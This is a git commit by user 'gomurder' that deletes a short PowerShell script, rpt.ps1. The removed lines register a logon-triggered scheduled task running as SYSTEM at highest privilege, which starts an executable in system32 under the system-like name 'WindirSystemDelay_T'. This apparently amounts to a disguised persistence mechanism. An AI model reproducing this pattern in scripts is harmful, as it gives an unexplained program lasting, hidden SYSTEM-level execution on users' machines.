044aafb561b35f5ca6ddca7cee55313fce4454d6
gomurder <35430198+gomurder@users.noreply.github.com>
2020-08-05 00:33:18 +0300

    Delete rpt.ps1

--- rpt.ps1
+++
@@ -1,8 +0,0 @@
-$Trigger= New-ScheduledTaskTrigger -AtLogon
-$User= "NT AUTHORITY\SYSTEM"
-$Action= New-ScheduledTaskAction -Execute "%windir%\System32\cmd.exe" -Argument "/c start %WINDIR%\system32\ptrplst.exe"
-Register-ScheduledTask -TaskName "WindirSystemDelay_T" -Trigger $Trigger -User $User -Action $Action -RunLevel Highest –Force
-
-
-
-
